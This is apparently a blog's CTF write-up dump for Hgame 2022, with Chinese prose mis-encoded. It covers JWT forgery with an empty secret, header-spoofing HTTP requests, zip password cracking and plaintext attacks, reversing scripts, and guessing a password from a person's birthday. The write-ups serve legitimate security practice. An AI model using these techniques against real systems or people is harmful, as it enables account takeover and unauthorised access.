ä¸Šé¢è¿™å›¾å¯ä»¥ç›´æ¥å¯¼å…¥è¿›å»ï¼Œç„¶åè§£æä¸€ä¸‹ å¤§æ¦‚å¯ä»¥çŸ¥é“æ˜¯ä¸ªç½‘å€ï¼Œä½†æ˜¯çŒœäº†çŒœä¸å¤§å¯¹ã€‚ äºæ˜¯æœäº†æœ homeboyc https://homeboyc.cn/friendlinks/ å‘ç°äº†å‹é“¾ https://homeginan.homeboyc.cn/ å™¢ï¼Œå…¶å®ä¸å¦‚ç›´æ¥çœ‹å›¾ç‰‡é‡Œçš„ é¸¿è´µå®‰ æœä¸€ä¸‹â€¦â€¦ æ˜¯ç¤¾å·¥é¢˜å•Šâ€¦â€¦ å®ï¼Œæƒ³ä½ ï¼Œå‘œå‘œã€‚å®ï¼Œä¸‹é¢çš„fl4gçš„å¯†ç ä½ åº”è¯¥çŸ¥é“çš„ï¼Œæˆ‘å°±ä¸è¯´äº†å˜å˜ã€‚ å¯¹äº†ï¼Œå®ï¼Œä½ å¯ä»¥ç”¨è¿™ä¸ªç½‘ç«™è§£å¯† CyberChef ã€‚ æˆ‘å…ˆç”¨â€œDerive PBKDF2 keyâ€æŠŠå¯†ç è½¬æˆäº†keyï¼ˆsalt=1ï¼‰ï¼Œç„¶åäº¤ç»™AESåŠ å¯†æ¨¡å—ç”¨ECBæ¨¡å¼åŠ å¯†äº†ï¼ˆåˆ«å¿˜äº†base64ï¼‰ã€‚ The following text is the ciphertext of fl4g after AES-128 encryption. b09nyMj9cOZ3aB8KUcnh46nIi9fGTIL6XjnnW1/sj/nUR1BFYkf0JwB0qjcQhcCy7dxtsHqznOMkt6XEGKD8y5K5whenAcwuiT/Rue+snORVWAorXsB3ZGcITuFLEIThbx4/vh5E/Wk4R8qhNcFh5bwSSmwdULVuwBrJ5H3+kBOsYafEqP8RDX3sOdXTj80V8Puq+TNbXAMhxvdLGkkcBQ== ç”Ÿæ—¥è¿™ç¯‡å¯ä»¥æ¨å‡ºæ¥ç”Ÿæ—¥æ˜¯ 20020816 ç»“åˆå¼±å¯†ç ï¼ŒåŒ…å«äº†åå­— hgaï¼Œç»“åˆæ¯”èµ›åç§°ï¼Œç›²çŒœå¯†ç æ˜¯ hgame20020816 äºæ˜¯å…ˆæ‹¿ Derive PBKDF2 key å¾—åˆ° key ä¸º 5728e1fb6ee26419b7a48a0cab579e74 ç„¶å AES è§£å¯†ä¸€ä¸‹å®Œäº‹ hgame{Wh0_4m_1?I_like_S0ciaI_En9in33ring} å°ç»“è¿‡å¹´å•¦ï¼Œè¿˜æ˜¯å¥½å¥½äº«å—ç”Ÿæ´»å¥½ï¼ å…¶ä»–çš„é¢˜åé¢å°±æ²¡æ€ä¹ˆçœ‹äº†ï¼Œæ‘¸å•¦ï¼ˆè·‘ åé¢ä¸¤å‘¨çš„è¯å¿™åˆ«çš„å»äº†ï¼Œä¹Ÿæ²¡æ€ä¹ˆçœ‹é¢˜ï¼Œå””ï¼ˆ ï¼ˆæ€ä¹ˆè¿™ç¯‡æ”¾è‰ç¨¿ç®±é‡Œéƒ½é•¿è‰äº† å•Šï¼Œä¸ç®¡äº†ç›´æ¥å‘å‡ºæ¥å§ ï¼ˆæºœäº†æºœäº†å–µ~","path":"2022/02/07/CTF_2022HgameWeek2/"},{"title":"CTF | 2022 Hgame Week1 WriteUp","text":"å¼•è¨€åˆæ˜¯ä¸€å¹´ä¸€åº¦ç³»åˆ—ï¼Œæ­å·ç”µå­ç§‘æŠ€å¤§å­¦ Vidar Team ä¸¾åŠçš„ Hgame æ¥äº†ï¼ ä¸»åŠæ–¹ï¼šæ­ç”µ Vidar-Team èµåŠ©æ–¹ï¼šå¥‡å®‰ä¿¡æŠ€æœ¯ç ”ç©¶é™¢ æ¯”èµ›æ—¶é—´ï¼š1/20 20:00 ~ 2/17 20:00 é¢˜ç›®ç±»å‹ï¼šCrypto ã€Reverseã€Miscã€Pwn ã€Webã€IoT æ¯”èµ›è§„åˆ™ï¼šè§£é¢˜æ¨¡å¼ï¼Œå‰ä¸‰è¡€åˆ†åˆ«æœ‰5%ï¼Œ3%ï¼Œ1%çš„é¢å¤–åŠ åˆ† ä»Šå¹´è¿˜æ˜¯å’Œå¾€å¹´ä¸€æ ·ï¼ŒæŒç»­å››å‘¨ï¼Œè¿™ç¯‡æ˜¯ç¬¬ä¸€å‘¨çš„ WriteUpï¼Œåšçš„é¢˜ç›®è¿˜æ˜¯æ¯”è¾ƒå¤šçš„ï¼Œä¸è¿‡ç›¸å¯¹è€Œè¨€æ¯”è¾ƒç®€å•ï¼Œå°±éšä¾¿æ°´ä¸€æ°´äº†ã€‚ åé¢å‡ å‘¨çš„è¯ï¼Œè¿‡å¹´å•¥çš„äº†å°±æ‘¸äº†ï¼ˆï¼ˆ å–µå–µå¾€å¹´çš„ WriteUpï¼š CTF | Hgame2020 Week1 WriteUp. CTF | 2021 Hgame Week1 WriteUp CTF | 2021 Hgame Week2 WriteUp CTF | 2021 Hgame Week3 WriteUp CTF | 2021 Hgame Week4 WriteUp å¹³å°ï¼š https://hgame.vidar.club/ IoTé¥­å¡çš„uno Description é¥­å¡ä»Šå¤©ç¬¬ä¸€å¤©å­¦iot ç„¶åä»–çš„å¥½æœ‹å‹Actueè®©ä»–å…ˆå»å­¦uno ç„¶åæ‚„æ‚„ç»™é¥­å¡å¡äº†ä¸€ä¸ªå›ºä»¶ Challenge Address https://potat0-1308188104.cos.ap-shanghai.myqcloud.com/Week1/%E5%A5%87%E5%A6%99%E7%9A%84%E5%9B%BA%E4%BB%B6.hex Webeasy_auth Description å°Šè´µçš„adminå†™äº†ä¸ªtodoå¸®åŠ©è‡ªå·±ç®¡ç†æ—¥å¸¸ï¼Œä½†ä»–å¥½åƒæ²¡è°ƒè¯•å®Œå°±éƒ¨ç½²äº†â€¦.ä¸€ä¸ªæœˆåï¼Œå½“ä»–å†ä¸€æ¬¡æ‰“å¼€ä»–çš„å°ç½‘ç«™ï¼Œä¼¼ä¹å¿˜è®°äº†å¯†ç â€¦ä»–çš„todoä¹‹å‰è®°å½•äº†å¾ˆé‡è¦çš„ä¸œè¥¿ï¼Œå¿«å¸®å¸®ä»–ä¸è¦çˆ†ç ´ï¼ Challenge Address http://adminisdoingwhat.mjclouds.com/ æ³¨å†Œä¸ªè´¦å·ç™»å½•ï¼Œå‘ç°è¿”å›æ¥çš„ token æ˜¯ JWTã€‚ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJRCI6MTcyNywiVXNlck5hbWUiOiJtZW93IiwiUGhvbmUiOiIiLCJFbWFpbCI6IiIsImV4cCI6MTY0MzA4ODQxMCwiaXNzIjoiTUpjbG91ZHMifQ.Or2NibhPn-EFCmzn7KhmRAZIv8lWJOM4phafnW22fHo åˆ° https://jwt.io/ æ”¹ä¸€ä¸‹ username ä¸º adminï¼Œ ID ä¸º 1 å°±è¡Œäº†ï¼Œç”šè‡³ secret ä¸ºç©ºã€‚ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJRCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBob25lIjoiIiwiRW1haWwiOiIiLCJleHAiOjE2NDMwODg0MTAsImlzcyI6Ik1KY2xvdWRzIn0.M0f40flOpZon5ynNtNUid7eR-MPpYXX7SoAAr8s-IrE ç„¶åæŠŠ localStorage é‡Œçš„ token æ”¹æˆè¿™ä¸ªï¼Œåˆ·æ–°é¡µé¢å°±çœ‹åˆ° flag äº†ã€‚ hgame{S0_y0u_K1n0w_hOw_~JwT_Works~1l1lL} è››è››â€¦å˜¿å˜¿â™¥æˆ‘çš„è››è›› Description è››è››â€¦å˜¿å˜¿â€¦æˆ‘çš„è››è››â€¦æˆ‘çš„è››è››æ­£åœ¨æ»¡åœ°æ‰¾å¤´ï¼Ÿï¼Ÿï¼Ÿ Challenge Address https://hgame-spider.vidar.club/786a9cef21 åªæœ‰ä¸€ä¸ª a æ ‡ç­¾æœ‰é“¾æ¥ï¼Œåæ­£å†™ä¸ªè„šæœ¬æå–ï¼Œä¸æ–­è®¿é—®ä¸‹å»å°±è¡Œäº†ã€‚ exp: \"\"\" MiaoTony \"\"\" from bs4 import BeautifulSoup import requests def is_valid_href(tag): return tag.has_attr('href') and tag.get('href') != '' url_raw = \"https://hgame-spider.vidar.club/786a9cef21\" url = url_raw cnt = 1 while True: print(cnt) r = requests.get(url) # if 'hgame' in r.text: if cnt == 100: print(r.text) break soup = BeautifulSoup(r.text, 'lxml') l = soup.find(is_valid_href) print(l.get('href')) url = url_raw + l.get('href') cnt += 1 print('==========') æœ€å100çš„æ—¶å€™æ˜¯è¿™ä¸ª https://hgame-spider.vidar.club/786a9cef21?key=RwURoQ2G0WGd%2FT8URO%2FXzMhqh59IXiSfn%2F1%2BxT%2B1nDng9X6mbXiFKg7vizZgM0iQlCH6bBTugENNpAKkNEhiIQ%3D%3D flag è— header é‡Œäº†ã€‚ Tetris plus Description æ®è¯´æ²¡äººèƒ½è¶…è¿‡ 3000 åˆ†ã€‚è¦æ˜¯åšé¢˜åšç´¯äº†ï¼Œå°±æ¥ç©ç©å°æ¸¸æˆå§(x Challenge Address https://game.summ3r.top/Tetris/index.html checking.js [][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+[+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]])[(![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]]((!![]+[])[+[]])[([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]](([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])+[])[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])() hgame{jsfuck_1s_S0_fUu1n} Fujiwara Tofu Shop Description æ˜¨æ™šæˆ‘è¾“ç»™ä¸€è¾†AE86ã€‚ä»–ç”¨æƒ¯æ€§æ¼‚ç§»è¿‡å¼¯ï¼Œä»–çš„è½¦å¾ˆå¿«ï¼Œæˆ‘åªçœ‹åˆ°ä»–æœ‰ä¸ªè±†è…åº—çš„æ‹›ç‰Œã€‚ Challenge Address http://shop.summ3r.top ç»å…¸è€ƒ header çš„é¢˜äº†ã€‚ ç”¨ X-Forwarded-For çš„è¯ä¼šæç¤º å¤§é»‘é˜”ä¹Ÿæƒ³å½“è½¦ç¥ï¼Ÿ æœ€ç»ˆ payloadï¼š GET / HTTP/1.1 Host: shop.summ3r.top User-Agent: Hachi-Roku Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Pragma: no-cache Cache-Control: no-cache X-Real-IP: 127.0.0.1 Referer: qiumingshan.net Cookie: flavor=Raspberry Gasoline: 100 Content-Length: 0 hgame{I_b0ught_4_S3xy_sw1mSu1t} Miscæ¬¢è¿æ¬¢è¿ï¼çƒ­çƒˆæ¬¢è¿ï¼ Description å…³æ³¨â€œå¥‡å®‰ä¿¡æŠ€æœ¯ç ”ç©¶é™¢â€å¾®ä¿¡å…¬ä¼—å·ï¼Œå‘é€ HelloHGAME2022 è·å¾—flag hgame{We1com3_t0_HG@ME_2O22} ç¾¤é’ï¼ˆå…¶å®æ˜¯å¹½çµä¸œäº¬ï¼‰ Description 4CTU3ä»å°å°±æ˜¯Yoasobiçš„ç‹‚çƒ­ç²‰ä¸ ä»Šå¤©å®ƒç»™å¤§å®¶å¸¦æ¥äº†ä¸€é¦–å®ƒè§‰å¾—å¾ˆå¥½å¬çš„è€æ­Œ å®ƒè¯´ä½ è¦ç”¨å¤šæ„Ÿå®˜å»æ„Ÿè§‰ Challenge Address https://potat0-1308188104.cos.ap-shanghai.myqcloud.com/Week1/%E7%BE%A4%E9%9D%92%EF%BC%8C%E4%BD%86%E6%98%AF%E6%98%AF%E5%B9%BD%E7%81%B5%E4%B8%9C%E4%BA%AC.wav SilentEye Yoasobi å¾—åˆ° https://potat0-1308188104.cos.ap-shanghai.myqcloud.com/Week1/S_S_T_V.wav åˆæ˜¯ SSTV å‘—ã€‚ hgame{1_c4n_5ee_the_wav} å¥½åº·çš„æµé‡ Description æ€»æ‰€å‘¨çŸ¥ é¥­å¡æ˜¯ä¸ªLSPå¹¶ååˆ†å–œæ¬¢å‘å…¶ä»–äººæ¨é”€ä»–çš„æ¶©å›¾ è®©æˆ‘ä»¬å»æ‚„æ‚„åº·åº·ä»–å‘äº†ä»€ä¹ˆ Challenge Address https://potat0-1308188104.cos.ap-shanghai.myqcloud.com/Week1/%E5%A5%BD%E5%BA%B7%E7%9A%84%E6%B5%81%E9%87%8F.pcapng SMTP æµé‡ ä¸»é¢˜æ˜¯ æˆ‘çŸ¥é“ä½ æ˜¯ä¸ªLSB æ¥åº·ç‚¹æ¶©å›¾ï¼ˆæƒ¹ ä¸€å¼ å›¾ç‰‡ï¼Œbase64 green 2ï¼ˆå¯èƒ½è¦åç›¸ hgame{ez_1mg_ LSB Steg4n0graphy} hgame{ez_1mg_Steg4n0graphy} è¿™ä¸ªå‹ç¼©åŒ…æœ‰ç‚¹éº»çƒ¦ Description è¿™ä¸ªå‹ç¼©åŒ…ï¼Œå®ƒçœŸçš„å¯ä»¥æ‰“å¼€å—ï¼Ÿ ï¼ˆé™„ä»¶å·²æ›´æ–°ï¼Œè¯·é‡æ–°ä¸‹è½½ï¼‰ Challenge Address https://potat0-1308188104.cos.ap-shanghai.myqcloud.com/Week1/%E8%BF%99%E4%B8%AA%E5%8E%8B%E7%BC%A9%E5%8C%85%E6%9C%89%E7%82%B9%E9%BA%BB%E7%83%A6-New.zip çˆ†ç ´pass 483279 README.txt I don't know if it's a good idea to write down all the passwords. ç»™äº†å¯†ç å­—å…¸ &amp;-`;qpCKliw2yTR\\ If you don't like to spend time compressing files, just stores them. æ˜æ–‡æ”»å‡» Store è·‘äº†ä¸€æ®µæ—¶é—´åœæ‰å°±è¡Œäº†ï¼Œå¾—åˆ°åŠ å¯†å¯†é’¥å°±å¥½ï¼Œç„¶åç¡®å®š æŠŠè§£å¯†åçš„å‹ç¼©åŒ…ä¿å­˜å°±å®Œäº‹ã€‚ å›¾ç§ï¼Œæå–å‡ºæ¥ï¼Œä¼ªåŠ å¯†ï¼Œ50 4B 03 04 14 00 09 00 ä»¥åŠ 50 4B 01 02 3F 00 14 00 00 00 æœ€åçš„ 09 æ”¹ 00 å°±è¡Œ hgame{W0w!_y0U_Kn0w_z1p_3ncrYpt!} Pwntest_your_nc Description å…¥é—¨ pwn çš„ç¬¬ä¸€æ­¥~ Challenge Address nc chuj.top 50254 Reverseeasyasm hgame{Fill_in_your_flag} ä¸å¯¹ çœ‹çœ‹é€»è¾‘8ï¼Œå•Šï¼Œ8086CPUï¼Œå¥½ä¹…æ²¡çœ‹æ±‡ç¼–éƒ½å¿«å¿˜å®Œäº†ï¼ˆï¼ˆï¼ˆ åˆ†åˆ«å–æ¯ä¸ªå­—ç¬¦ï¼Œé€»è¾‘å·¦ç§»4ä½è€Œå pushï¼Œå†å–åŒä¸€ä¸ªå­—ç¬¦é€»è¾‘å³ç§»4ä½ï¼Œpop å¼¹å‡ºä¹‹å‰çš„ç»“æœè¿›è¡Œç›¸åŠ å­˜åˆ° ax é‡Œï¼Œå†å’Œ 0x17 å¼‚æˆ–ï¼Œæœ€åæŠŠç»“æœå’Œ es é‡Œçš„ seg001 åšå¯¹æ¯”ï¼Œç›¸åŒå³åˆ¤æ–­ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚ seg001 916101C141A06041D12114C141E250E1E25420C1E2601430D151C01700000000 åè¿‡æ¥å†™å°±è¡Œäº†ï¼Œé«˜4ä½ä½4ä½äº¤æ¢ä¸€ä¸‹å°±å¥½ã€‚ exp: \"\"\" MiaoTony \"\"\" with open('seg001.txt', 'r') as f: s = f.read() print(s) b = bytes.fromhex(s) r = '' for i in b: i ^= 0x17 print(i, hex(i)) x = (i % 0x10 &lt;&lt; 4) | (i // 0x10) # print(hex(x)) r += chr(x) print(r) # hgame{welc0me_to_4sm_w0rld} Flag Checker Description A Flag Checker,can you pass this check?flagæ ¼å¼ï¼šhgame{} Challenge Address https://0wl-1308188104.cos.ap-shanghai.myqcloud.com/week1/flagchecker.apk å®‰å“é€†å‘ package com.example.flagchecker; import android.util.Base64; import android.view.View; import android.view.View.OnClickListener; import android.widget.EditText; import android.widget.Toast; class MainActivity$1 implements View.OnClickListener { MainActivity$1(MainActivity paramMainActivity) {} public void onClick(View paramView) { Object localObject = ((EditText)this.this$0.findViewById(2131165238)).getText().toString(); paramView = new byte[0]; try { localObject = MainActivity.encrypt((String)localObject, \"carol\"); paramView = (View)localObject; } catch (Exception localException) { localException.printStackTrace(); } if (Base64.encodeToString(paramView, 0).replace(\"\\n\", \"\").equals(\"mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=\")) { Toast.makeText(this.this$0, \"Congratulations!!!\", 1).show(); } else { Toast.makeText(this.this$0, \"Fail,try again.\", 1).show(); } } } package com.example.flagchecker; import android.os.Bundle; import android.support.v7.app.AppCompatActivity; import android.widget.Button; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; public class MainActivity extends AppCompatActivity { public static byte[] encrypt(String paramString1, String paramString2) throws Exception { SecretKeySpec localSecretKeySpec = new SecretKeySpec(paramString2.getBytes(), 0, paramString2.length(), \"RC4\"); paramString2 = Cipher.getInstance(\"RC4\"); paramString2.init(1, localSecretKeySpec); return paramString2.doFinal(paramString1.getBytes()); } protected void onCreate(Bundle paramBundle) { super.onCreate(paramBundle); setContentView(2131296284); ((Button)findViewById(2131165218)).setOnClickListener(new MainActivity.1(this)); } } RC4 åŠ è§£å¯†ï¼Œå¯†ç ä¸º carol æ„é€ å™¨ æè¿° SecretKeySpec(byte[] key, int offset, int len, String algorithm) ä½¿ç”¨ lençš„ç¬¬ä¸€ä¸ª lenå­—èŠ‚æ„é€ æ¥è‡ªç»™å®šå­—èŠ‚æ•°ç»„çš„ key ï¼Œä» offsetå¼€å§‹ã€‚ SecretKeySpec(byte[] key, String algorithm) ä»ç»™å®šçš„å­—èŠ‚æ•°ç»„æ„é€ ä¸€ä¸ªå¯†é’¥ã€‚ http://tool.chacuo.net/cryptrc4 